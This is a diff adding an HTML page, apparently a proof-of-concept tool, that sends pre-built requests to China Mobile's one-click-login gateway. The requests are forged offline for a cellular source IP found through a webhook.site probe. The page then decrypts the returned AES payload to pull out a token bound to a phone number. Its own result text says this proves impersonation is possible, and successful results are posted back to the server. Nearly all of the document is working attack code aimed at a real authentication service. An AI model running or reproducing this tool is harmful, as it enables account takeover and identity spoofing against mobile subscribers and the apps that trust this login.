@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>一键登录取号实测 · Token Probe</title>
+<style>
+  :root{
+    --bg:#0f1424; --panel:#171d33; --line:#2a3350; --fg:#e8ecf8; --muted:#9aa4c4;
+    --accent:#6ea8ff; --green:#3fd07a; --red:#ff6b6b; --amber:#ffb64d;
+    --amber-bg:#3a2a10; --green-bg:#12301f; --red-bg:#331717; --code:#0b0f1c;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;padding:24px 16px 60px;background:var(--bg);color:var(--fg);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;
+    line-height:1.6;max-width:860px;margin:0 auto}
+  h1{font-size:22px;margin:0 0 4px}
+  h2{font-size:16px;margin:0 0 10px;color:var(--accent)}
+  header p{color:var(--muted);margin:6px 0 0;font-size:14px}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:16px 18px;margin:16px 0}
+  .note{color:var(--muted);font-size:13px}
+  ul{margin:8px 0;padding-left:20px}
+  li{margin:4px 0}
+  code{background:var(--code);padding:2px 7px;border-radius:6px;color:#cdd6f7;word-break:break-all;font-size:12.5px}
+  label{display:block;font-size:13px;color:var(--muted);margin:10px 0 4px}
+  textarea,input[type=text]{width:100%;background:var(--code);color:#dbe3ff;border:1px solid var(--line);
+    border-radius:10px;padding:10px 12px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12.5px}
+  textarea{resize:vertical}
+  .row{display:flex;gap:10px;flex-wrap:wrap}
+  .row>div{flex:1;min-width:220px}
+  button{background:var(--accent);color:#08122b;border:0;border-radius:10px;padding:12px 20px;
+    font-size:15px;font-weight:700;cursor:pointer;margin-top:14px}
+  button:active{transform:translateY(1px)}
+  .verdict{border-radius:12px;padding:14px 16px;margin:14px 0;font-size:15px;display:none}
+  .verdict.show{display:block}
+  .v-ok{background:var(--green-bg);border:1px solid #1f6b41;color:var(--green)}
+  .v-bad{background:var(--red-bg);border:1px solid #7a2b2b;color:var(--red)}
+  .v-warn{background:var(--amber-bg);border:1px solid #5a4318;color:var(--amber)}
+  pre{background:var(--code);border:1px solid var(--line);border-radius:10px;padding:12px;
+    overflow:auto;font-size:12px;color:#c7d2f0;white-space:pre-wrap;word-break:break-all;max-height:340px}
+  .kv{font-size:13px;margin:4px 0}
+  .kv b{color:var(--fg)}
+  .amberbox{border-color:#5a4318;background:var(--amber-bg)}
+  .amberbox h2{color:var(--amber)}
+  .tokbox{border:1px solid #1f6b41;background:var(--green-bg);border-radius:10px;padding:10px 12px;margin:10px 0}
+  summary{cursor:pointer;color:var(--accent);font-size:13px}
+</style>
+</head>
+<body>
+<header>
+  <h1>一键登录取号实测 · Token Probe</h1>
+  <p>用 <code>build_cmcc_request.py</code> 生成的 headers/body 直接向移动认证网关发起请求，检测<b>是否真的能取到 token</b>。</p>
+</header>
+
+<div class="card amberbox">
+  <h2>📶 使用前必读</h2>
+  <ul class="note">
+    <li><b>必须走蜂窝</b>：网关按蜂窝链路源 IP 取号。手机请<b>关 WiFi、开移动数据</b>后再运行；否则大概率返回错误码。</li>
+    <li><b>请求数据由服务端按经你确认的源 IP 现算</b>：Webhook 模式先由你点击触发一次 IP 探测；本机监听器回传 Webhook.site 记录的 <code>ip</code> 后，页面展示该 IPv6。只有你再次点击确认，服务端才生成并返回 CMCC 请求。</li>
+    <li><b>直连、勿经代理</b>：中间若有改写源地址的代理/NAT，检测到的 IP 会失真。可访问 <code>/whoami</code> 核对。</li>
+  </ul>
+</div>
+
+<div class="card" id="flowcard" style="display:none">
+  <h2>0. 获取并确认当前公网 IPv6</h2>
+  <p class="note">点击后会向 Webhook.site 发送一个不携带 Cookie、请求体或当前页面地址的图片探测请求。随机 <code>flow_id</code> 只用于关联本次流程。</p>
+  <button id="probe">① 开始 IPv6 探测</button>
+  <p id="flowstatus" class="note">尚未开始。</p>
+  <img id="ip-probe" hidden referrerpolicy="no-referrer" alt=""/>
+</div>
+
+<div class="card">
+  <h2>1. 请求数据（服务端已按你的 IP 生成）</h2>
+  <p class="note">读取其中的 <code>url / headers / body_raw</code> 发送。如需手工调整可直接编辑后再发。</p>
+  <label>请求 JSON</label>
+  <textarea id="reqjson" rows="12"></textarea>
+</div>
+
+<div class="card">
+  <h2>2. 响应解密参数（用于还原 token）</h2>
+  <p class="note">网关把 token 放在 AES 加密的 <code>resultData</code> 里。填脚本中的会话 AES 密钥/IV（Base64），本页会在浏览器内解密并提取 token。留空则只按返回码判断是否取号成功。</p>
+  <div class="row">
+    <div><label>AES Key (Base64)</label><input id="aeskey" type="text" value="__AES_KEY__"/></div>
+    <div><label>AES IV (Base64)</label><input id="aesiv" type="text" value="__AES_IV__"/></div>
+  </div>
+  <p class="note">解密顺序：优先用响应体自带的 <code>encryptedIV</code>，其次用这里填的 IV，再次用请求体的 IV。</p>
+</div>
+
+<button id="go">② 确认 IPv6，生成并发送请求</button>
+
+<div id="verdict" class="verdict"></div>
+
+<div class="card" id="resultcard" style="display:none">
+  <h2>3. 检测结果</h2>
+  <div id="meta"></div>
+  <div id="tokwrap"></div>
+  <details style="margin-top:10px"><summary>展开原始响应 / 请求详情</summary>
+    <div class="kv" style="margin-top:8px"><b>请求 URL：</b><span id="dbg-url"></span></div>
+    <div class="kv"><b>实际发送的 Headers：</b></div><pre id="dbg-headers"></pre>
+    <div class="kv"><b>响应原文：</b></div><pre id="dbg-resp"></pre>
+    <div class="kv"><b>解密后的业务参数串：</b></div><pre id="dbg-plain">（未解密）</pre>
+  </details>
+</div>
+
+<div class="card">
+  <h2>4. curl 复核（服务端视角）</h2>
+  <p class="note">浏览器打不通或想旁证时，用脚本输出里的 <code>curl</code> 从任意能连到网关的终端跑（curl 不受 CORS 限制）。返回体里出现 <code>103000</code> 且 <code>resultData</code> 非空即代表取到 token。</p>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+
+// ---- 预填：服务端 build_cmcc_request.py 现算的 url / headers / body_raw ----
+const FLOW_CONFIG = __FLOW_CONFIG_JSON__;
+let PREFILL = __PREFILL_JSON__;
+$('reqjson').value = PREFILL ? JSON.stringify(PREFILL, null, 2) : '等待 IPv6 探测完成并由你确认…';
+
+let flowPollTimer = null;
+let flowReady = FLOW_CONFIG.mode === 'direct';
+if(FLOW_CONFIG.mode === 'webhook'){
+  $('flowcard').style.display='block';
+  $('go').disabled=true;
+}else{
+  $('go').textContent='▶ 发送请求并检测 token';
+}
+
+async function sameOriginJson(path, options={}){
+  const resp=await fetch(path,{cache:'no-store',credentials:'same-origin',...options});
+  let data=null; try{ data=await resp.json(); }catch(_){}
+  if(!resp.ok) throw new Error((data&&data.error)||('HTTP '+resp.status));
+  return data;
+}
+
+function stopFlowPolling(){
+  if(flowPollTimer!==null){ clearInterval(flowPollTimer); flowPollTimer=null; }
+}
+
+async function pollFlow(){
+  try{
+    const state=await sameOriginJson('/api/flows/'+encodeURIComponent(FLOW_CONFIG.flow_id)+'/status');
+    if(state.status==='ready'){
+      stopFlowPolling(); flowReady=true; $('go').disabled=false;
+      $('flowstatus').textContent='已观测到 IPv6：'+state.observed_ip+'。请核对网络后点击下方确认按钮。';
+    }else if(state.status==='consumed'){
+      stopFlowPolling(); $('flowstatus').textContent='本次 flow 已消费，请刷新页面重新开始。';
+    }else{
+      $('flowstatus').textContent='等待本机监听器回传 IPv6… 剩余约 '+state.expires_in+' 秒';
+    }
+  }catch(e){
+    stopFlowPolling(); $('flowstatus').textContent='探测失败：'+e.message;
+  }
+}
+
+function startIpProbe(){
+  const button=$('probe');
+  button.disabled=true;
+  $('flowstatus').textContent='已发送探测请求，等待本机监听器…';
+  const sep=FLOW_CONFIG.webhook_url.includes('?')?'&':'?';
+  $('ip-probe').src=FLOW_CONFIG.webhook_url+sep+'_='+Date.now();
+  pollFlow();
+  flowPollTimer=setInterval(pollFlow,1500);
+}
+
+async function prepareFlowRequest(){
+  if(FLOW_CONFIG.mode!=='webhook') return;
+  if(!flowReady) throw new Error('IPv6 探测尚未完成');
+  const data=await sameOriginJson('/api/flows/'+encodeURIComponent(FLOW_CONFIG.flow_id)+'/request',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({confirmed:true})
+  });
+  PREFILL=data.request;
+  $('reqjson').value=JSON.stringify(PREFILL,null,2);
+  flowReady=false;
+  $('go').disabled=true;
+  $('flowstatus').textContent='本次 flow 已消费；请求已按该 IPv6 生成。';
+}
+
+// 浏览器禁止手动设置的 header（会被忽略/报错），先过滤掉
+const FORBIDDEN = new Set(['connection','content-length','host','origin','referer','user-agent',
+  'accept-encoding','accept-charset','date','cookie','keep-alive','transfer-encoding','via']);
+
+// 常见移动认证返回码
+const CODE_DESC = {
+  '103000':'成功，已下发 token',
+  '103101':'签名验证失败',
+  '103119':'appid 或 sign 校验不通过',
+  '105012':'请求参数错误',
+  '105018':'缺少必要参数',
+  '105313':'非法请求（源 IP/会话不匹配或重放被拒）',
+  '200005':'资费/网络能力限制',
+  '200082':'请求超时'
+};
+
+function b64ToBytes(s){
+  s = (s||'').replace(/\s+/g,'');
+  if(!s) return null;
+  const bin = atob(s);
+  const a = new Uint8Array(bin.length);
+  for(let i=0;i<bin.length;i++) a[i]=bin.charCodeAt(i);
+  return a;
+}
+
+async function aesCbcDecrypt(keyBytes, ivBytes, ctBytes){
+  const key = await crypto.subtle.importKey('raw', keyBytes, {name:'AES-CBC'}, false, ['decrypt']);
+  const pt = await crypto.subtle.decrypt({name:'AES-CBC', iv: ivBytes}, key, ctBytes);
+  return new TextDecoder('utf-8').decode(pt);
+}
+
+// 在响应 JSON 里找出可能承载 token 的加密字段
+function findResultData(j){
+  if(!j || typeof j!=='object') return null;
+  const keys = ['resultData','resultdata','encryptData','encryptedData','data'];
+  for(const k of keys){
+    if(typeof j[k]==='string' && j[k].replace(/\s+/g,'').length>=24) return j[k];
+  }
+  // 兜底：递归找最长的类 base64 字符串
+  let best=null;
+  (function walk(o){
+    if(o && typeof o==='object'){ for(const v of Object.values(o)) walk(v); }
+    else if(typeof o==='string' && /^[A-Za-z0-9+/=\s]+$/.test(o) && o.replace(/\s+/g,'').length>=40){
+      if(!best || o.length>best.length) best=o;
+    }
+  })(j);
+  return best;
+}
+
+function findCode(j){
+  if(!j||typeof j!=='object') return null;
+  for(const k of ['resultCode','resultcode','result','code','statusCode']){
+    if(j[k]!=null) return String(j[k]);
+  }
+  return null;
+}
+
+function setVerdict(cls, html){
+  const v=$('verdict'); v.className='verdict show '+cls; v.innerHTML=html;
+}
+
+async function run(){
+  $('resultcard').style.display='none';
+  $('tokwrap').innerHTML=''; $('dbg-plain').textContent='（未解密）';
+  setVerdict('v-warn','⏳ 正在发送请求…');
+
+  try{ await prepareFlowRequest(); }
+  catch(e){ setVerdict('v-bad','❌ 无法生成请求：'+e.message); return; }
+
+  let req;
+  try{ req = JSON.parse($('reqjson').value); }
+  catch(e){ setVerdict('v-bad','❌ 请求 JSON 解析失败：'+e.message); return; }
+
+  const url = (req.url||'').trim();
+  const rawHeaders = req.headers || {};
+  const body = (req.body_raw!=null) ? req.body_raw : JSON.stringify(req.body||{});
+  if(!url){ setVerdict('v-bad','❌ JSON 里缺少 url'); return; }
+
+  // 过滤浏览器禁止的 header
+  const headers={}, dropped=[];
+  for(const [k,v] of Object.entries(rawHeaders)){
+    if(FORBIDDEN.has(k.toLowerCase())) dropped.push(k);
+    else headers[k]=String(v);
+  }
+
+  let resp, text='';
+  const t0=performance.now();
+  try{
+    resp = await fetch(url, {method:'POST', mode:'cors', headers, body});
+    text = await resp.text();
+  }catch(e){
+    setVerdict('v-warn','⚠️ 请求未能完成：<b>'+e.message+'</b><br>常见原因：当前不在蜂窝网络 / 网关不可达 / 该网络无法路由到 <code>rcs.cmpassport.com</code>。请关 WiFi 用移动数据重试，或改用第 4 区的 curl 从服务端旁证。');
+    return;
+  }
+  const ms=Math.round(performance.now()-t0);
+
+  // 展示调试信息
+  $('resultcard').style.display='block';
+  $('dbg-url').textContent=url;
+  $('dbg-headers').textContent=JSON.stringify(headers,null,2)+(dropped.length?('\n// 已被浏览器忽略的 header: '+dropped.join(', ')):'');
+  $('dbg-resp').textContent=text || '(空响应体)';
+
+  let j=null; try{ j=JSON.parse(text); }catch(_){}
+  const code = j?findCode(j):null;
+  const codeDesc = code ? (CODE_DESC[code]||'未知返回码') : '响应非 JSON 或无返回码字段';
+
+  $('meta').innerHTML =
+    '<div class="kv"><b>HTTP 状态：</b>'+resp.status+' '+resp.statusText+'（耗时 '+ms+' ms）</div>'+
+    '<div class="kv"><b>返回码：</b>'+(code?('<code>'+code+'</code> — '+codeDesc):'—')+'</div>';
+
+  // 尝试解密 resultData 还原 token
+  let token=null, plain=null, decErr=null;
+  const rd = j?findResultData(j):null;
+  if(!j){
+    decErr='响应不是 JSON，无法定位 resultData。';
+  } else if(!rd){
+    decErr='响应 JSON 中未找到 resultData / encryptedData 字段。';
+  } else {
+    if(!(window.crypto&&crypto.subtle)){
+      decErr='当前环境不支持 SubtleCrypto（需 https 或 file:// 安全上下文），无法在页面内解密。';
+    }else{
+      const keyBytes=b64ToBytes($('aeskey').value);
+      const ctBytes=b64ToBytes(rd);
+      const ivCands=[];
+      const ivSrc=[];
+      if(j.encryptedIV){ ivCands.push(b64ToBytes(j.encryptedIV)); ivSrc.push('response.encryptedIV'); }
+      if($('aesiv').value){ ivCands.push(b64ToBytes($('aesiv').value)); ivSrc.push('page IV input'); }
+      try{ const rb=JSON.parse(body); if(rb.encryptedIV){ ivCands.push(b64ToBytes(rb.encryptedIV)); ivSrc.push('request.encryptedIV'); } }catch(_){}
+      if(!keyBytes){
+        decErr='未填 AES Key（Base64 输入为空或非法），跳过解密。';
+      } else if(!ctBytes){
+        decErr='resultData Base64 解码失败：'+String(rd).slice(0,80)+'…';
+      } else if(ivCands.filter(Boolean).length===0){
+        decErr='没有可用的 AES IV：响应体、页面输入和请求体都没提供。';
+      } else {
+        const attempts=[];
+        for(let i=0;i<ivCands.length;i++){
+          const iv=ivCands[i];
+          if(!iv){ attempts.push(ivSrc[i]+': IV Base64 解码失败'); continue; }
+          try{ plain=await aesCbcDecrypt(keyBytes, iv, ctBytes); break; }
+          catch(e){ attempts.push(ivSrc[i]+': '+(e&&e.message?e.message:'AES-CBC 解密失败（padding/key/iv 不匹配）')); }
+        }
+        if(plain==null) decErr='resultData 解密全部失败：\n  '+attempts.join('\n  ');
+      }
+    }
+  }
+
+  if(plain!=null){
+    $('dbg-plain').textContent=plain;
+    // 从 &k=v 参数串或 JSON 中提取 token
+    let m = plain.match(/token=([^&]+)/i) || plain.match(/"token"\s*:\s*"([^"]+)"/i);
+    if(m) token=m[1];
+  } else {
+    $('dbg-plain').textContent='（解密失败）'+(decErr?('\n\n'+decErr):'');
+  }
+
+  // 结论
+  const got = (code==='103000') || !!token;
+  if(got){
+    let inner='✅ <b>成功取到 token</b>：网关返回 <code>'+(code||'103000')+'</code>';
+    inner+= token? ('，并已解密还原出 token。') : ('，响应含加密 resultData（token 载体）。');
+    setVerdict('v-ok', inner+'<br>这证明：<b>用离线构造的请求即可从网关换到与手机号绑定的一次性 token</b>，仿冒风险成立。'+
+      (plain==null && decErr ? '<br><span style="color:var(--amber)">解密未成功：'+decErr.replace(/\n/g,'<br>')+'</span>' : ''));
+    if(token){
+      $('tokwrap').innerHTML='<div class="tokbox"><b>解密得到的 token：</b><br><code>'+token.replace(/[<>&]/g,'')+'</code></div>';
+    }
+    if(code==='103000' && rd && FLOW_CONFIG.mode==='webhook' && FLOW_CONFIG.flow_id){
+      sameOriginJson('/api/flows/'+encodeURIComponent(FLOW_CONFIG.flow_id)+'/decrypt',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({resultData:rd, encryptedIV:j&&j.encryptedIV||null, resultCode:code})
+      }).catch(e=>console.warn('server decrypt log failed:', e.message));
+    }
+  }else if(code){
+    setVerdict('v-bad','❌ <b>本次未取到 token</b>：返回码 <code>'+code+'</code> — '+codeDesc+
+      '。<br>若为 <code>105313</code>，通常是 <code>ipv6List/socketIp</code> 与当前蜂窝会话不符：请确认服务端启动参数 <code>--ipv6</code> 或访问 <code>/whoami</code> 核对源 IP。');
+  }else{
+    setVerdict('v-warn','⚠️ 已收到响应但无法判定返回码，请展开下方原始响应人工确认。');
+  }
+}
+
+$('go').addEventListener('click', ()=>{ run().catch(e=>setVerdict('v-bad','❌ 运行异常：'+e.message)); });
+if(FLOW_CONFIG.mode==='webhook') $('probe').addEventListener('click', startIpProbe);
+</script>
+</body>
+</html>
